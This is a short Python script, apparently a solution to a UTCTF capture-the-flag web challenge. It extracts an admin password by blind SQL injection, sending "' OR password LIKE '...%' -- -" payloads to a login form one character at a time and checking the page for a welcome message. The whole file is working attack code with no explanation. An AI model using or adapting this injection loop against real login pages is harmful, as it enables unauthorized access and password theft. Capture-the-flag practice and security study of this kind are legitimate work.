import requests
import base64
import string
url = "http://web2.utctf.live:5006/"
flag = ""
dict = "abecdsfghjklmnpqtuvxyzerio1234567890!@$^&*()+|}{:?><,./;'[]\=-"

while True:
	for i in dict:
		password = flag + i
		payload = "\' OR password LIKE '" + password + "%' -- -"
		
		r = requests.post(url, data={'username':'admin', 'pass':payload})
		if "Welcome, admin!" in r.text:
			flag += i
			break
	print(flag)


